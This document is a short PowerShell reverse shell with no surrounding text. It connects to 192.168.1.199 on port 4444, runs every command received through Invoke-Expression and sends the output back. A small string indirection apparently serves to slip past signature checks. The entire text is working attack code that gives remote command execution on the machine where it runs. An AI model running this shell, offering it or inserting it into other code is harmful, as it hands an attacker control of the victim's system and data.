$sm=(New-Object Net.Sockets.TCPClient('192.168.1.199',4444)).GetStream();
[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;
$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$var = "ASCII";
$st=([text.encoding]::$var).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}